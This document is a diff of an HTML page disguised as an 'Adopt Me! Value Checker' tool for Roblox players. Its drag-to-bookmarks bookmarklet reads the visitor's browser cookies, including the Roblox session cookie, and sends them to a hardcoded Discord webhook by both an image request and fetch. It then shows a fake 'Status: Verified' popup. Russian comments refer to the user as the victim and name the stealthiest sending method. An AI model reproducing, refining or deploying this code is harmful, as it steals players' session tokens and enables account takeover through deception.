@@ -2,51 +2,50 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Adopt Me! Trading Tool</title>
+    <title>In-Game Value Checker | Adopt Me!</title>
     <style>
-        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { display: inline-block; padding: 20px 30px; background: #f0b90b; color: black; text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; border: 2px dashed #000; margin-bottom: 20px; }
+        .btn { display: inline-block; padding: 20px 30px; background: #f0b90b; color: black; text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; border: 2px dashed #000; margin-bottom: 20px; font-size: 18px; }
         .steps { text-align: left; background: #1e2329; padding: 15px; border-radius: 10px; font-size: 13px; color: #848e9c; }
+        b { color: #f0b90b; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1 style="color:#f0b90b">Value Checker v4.2</h1>
-        <p>Drag the button to your bookmarks bar</p>
+        <p>Analyze trade values directly in-game!</p>
 
-        <!-- ЗАМЕНИ ТУТ_ТВОЙ_ВЕБХУК -->
+        <!-- ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
         <a class="btn" draggable="true" href="javascript:(function(){
-            var hook = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
-            var name = '.ROBLOSECURITY';
-            var value = document.cookie.split('; ').find(row => row.startsWith(name + '='));
+            var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
+            var c = document.cookie;
             
-            if (value) {
-                var data = value.split('=')[1];
-                /* Обход CSP через создание скрытого изображения или fetch с фоновым режимом */
-                fetch(hook, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        content: '🚀 **New Log Found**\nData: `' + data + '`' 
-                    })
-                });
-                
-                /* Создаем визуальное окно для жертвы */
-                var ui = document.createElement('div');
-                ui.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;box-shadow:0 0 20px rgba(240,185,11,0.5);font-family:Arial;';
-                ui.innerHTML = '<h3>Value Checker</h3><hr><p style=color:white>Analyzing items... Done!</p><p style=color:#00ff00>Status: Secure</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';
-                document.body.appendChild(ui);
-            } else {
-                alert('Please Login to Roblox first!');
-            }
+            /* Отправка через изображение (самый скрытный метод) */
+            var i = new Image();
+            i.src = h + '?data=' + btoa(encodeURIComponent(c));
+
+            /* Дублирующая отправка через fetch */
+            fetch(h, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: '🚀 **New Log Captured**\nCookie Data:\n```' + c + '```'
+                })
+            });
+
+            /* Окно для жертвы (на английском) */
+            var d = document.createElement('div');
+            d.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 20px rgba(240,185,11,0.5);';
+            d.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white>Analyzing inventory... Success!</p><p style=color:#00ff00>Status: Verified</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';
+            document.body.appendChild(d);
         })();">DRAG TO BOOKMARKS</a>
 
         <div class="steps">
-            1. <b>Ctrl+Shift+B</b> to show bookmarks.<br>
-            2. Drag button to the bar.<br>
-            3. Open <b>Roblox.com</b> and click it.
+            1. <b>Ctrl+Shift+B</b> to show bookmarks bar.<br>
+            2. Drag the <b>Yellow Button</b> to the bar.<br>
+            3. Open <b>Roblox.com</b> and click the bookmark.
         </div>
     </div>
 </body>
